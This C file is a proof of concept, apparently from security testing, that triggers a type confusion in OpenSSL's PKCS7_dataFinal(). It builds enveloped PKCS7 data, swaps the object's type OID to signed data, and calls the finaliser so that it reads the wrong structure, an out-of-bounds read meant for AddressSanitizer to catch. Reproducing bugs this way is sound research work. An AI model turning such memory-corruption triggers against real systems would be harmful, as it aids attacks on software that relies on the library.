/*
 * PoC for SF09: Type confusion in PKCS7_dataFinal() via mismatched type OID
 *
 * Set p7->type to NID_pkcs7_signed but populate d.enveloped instead.
 * PKCS7_dataFinal uses OBJ_obj2nid(p7->type) to dispatch, then accesses
 * p7->d.sign->signer_info, but since p7->d actually contains enveloped data,
 * we get type confusion / OOB read.
 */
#include <openssl/pkcs7.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/objects.h>
#include <openssl/x509.h>
#include <openssl/asn1.h>
#include <string.h>
#include <stdio.h>

int main(void) {
    OPENSSL_init_crypto(0, NULL);

    /* First create a valid enveloped p7 */
    PKCS7 *p7 = PKCS7_new();
    if (!p7) return 1;

    PKCS7_set_type(p7, NID_pkcs7_enveloped);
    PKCS7_set_cipher(p7, EVP_aes_128_cbc());

    /* Create key/cert for adding recipient */
    EVP_PKEY *pkey = EVP_PKEY_new();
    EVP_PKEY_CTX *pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
    EVP_PKEY_keygen_init(pctx);
    EVP_PKEY_CTX_set_rsa_keygen_bits(pctx, 1024);
    EVP_PKEY_keygen(pctx, &pkey);
    EVP_PKEY_CTX_free(pctx);

    X509 *cert = X509_new();
    X509_set_version(cert, 2);
    ASN1_INTEGER_set(X509_get_serialNumber(cert), 1);
    X509_gmtime_adj(X509_get_notBefore(cert), 0);
    X509_gmtime_adj(X509_get_notAfter(cert), 31536000L);
    X509_set_pubkey(cert, pkey);
    X509_NAME *xname = X509_get_subject_name(cert);
    X509_NAME_add_entry_by_txt(xname, "CN", MBSTRING_ASC,
        (unsigned char *)"Test", -1, -1, 0);
    X509_set_issuer_name(cert, xname);
    X509_sign(cert, pkey, EVP_sha256());

    PKCS7_add_recipient(p7, cert);

    /* Initialize data BIO */
    BIO *bio = PKCS7_dataInit(p7, NULL);
    if (!bio) {
        fprintf(stderr, "PKCS7_dataInit failed\n");
        ERR_print_errors_fp(stderr);
        goto cleanup;
    }

    BIO_write(bio, "test data", 9);

    /* NOW: change the type to NID_pkcs7_signed while d still contains
     * enveloped data - this is the type confusion */
    ASN1_OBJECT_free(p7->type);
    p7->type = OBJ_nid2obj(NID_pkcs7_signed);

    fprintf(stderr, "Calling PKCS7_dataFinal with type confusion (signed vs enveloped)...\n");
    int ret = PKCS7_dataFinal(p7, bio);
    fprintf(stderr, "PKCS7_dataFinal returned: %d\n", ret);
    if (!ret) {
        ERR_print_errors_fp(stderr);
    }

    BIO_free_all(bio);

cleanup:
    X509_free(cert);
    EVP_PKEY_free(pkey);
    /* Don't free p7 normally since we corrupted its type field */
    /* Just let ASAN detect leaks if any */
    return 0;
}
